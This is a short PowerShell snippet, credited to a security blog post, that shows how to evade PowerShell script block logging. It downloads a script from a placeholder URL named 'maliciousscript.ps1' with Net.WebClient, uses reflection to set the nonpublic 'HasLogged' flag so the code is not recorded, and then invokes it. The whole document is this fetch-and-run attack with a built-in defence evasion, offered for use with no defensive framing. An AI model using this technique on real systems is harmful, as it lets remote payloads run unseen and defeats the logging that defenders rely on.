# technique from https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/

# This script is not logged yet because its not executed
$script = (New-Object Net.WebClient).DownloadString('https://url/maliciousscript.ps1')
# Set the HasLogged value to true, so that it's not "logged again"
[ScriptBlock].getproperty("HasLogged",@('nonpublic','instance')).setvalue($script, $true)

# Invoke it, this will not get logged
$script.invoke()
